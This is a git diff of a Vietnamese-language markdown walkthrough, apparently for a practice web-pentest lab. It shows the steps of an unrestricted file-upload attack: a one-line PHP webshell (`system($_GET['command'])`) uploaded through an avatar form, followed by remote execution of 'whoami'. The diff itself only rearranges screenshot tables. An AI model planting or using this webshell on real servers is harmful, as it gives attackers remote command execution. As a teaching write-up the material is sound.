@@ -250,19 +250,20 @@ if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
 ### 📌 1. Kiểm tra chức năng upload với file hình ảnh hợp lệ.  
 - Upload một file `.png` để kiểm tra đường dẫn lưu trữ trên server.  
 - Quan sát thấy file được lưu vào thư mục `/web_pen_v1/public/uploads/`.  
-
+  | Test |  Check |
+  |---|---|
+  | ![Test](screenshots/testimg.png) | ![Check](screenshots/checkimg.png) |
 ---
 
 ### 📌 2. Tạo Webshell với payload PHP  
 Tạo file **`pls.php`** với nội dung:  
-
 ```php
 <?php echo system($_GET['command']); ?>
 ```
 ### 📌 3. Upload file pls.php thông qua chức năng Upload Avatar
-  | Test |  Check |
+  | Check |  Test |
   |---|---|
-  | ![Test](screenshots/testimg.png) | ![Check](screenshots/checkimg.png) |
+  | ![Check](screenshots/check-webshell.png) | ![Test](screenshots/upload-webshell.png) |
 ### 📌 4. Thực thi lệnh từ xa
 Gửi request thực thi lệnh whoami để xác định user chạy webserver:
 ```
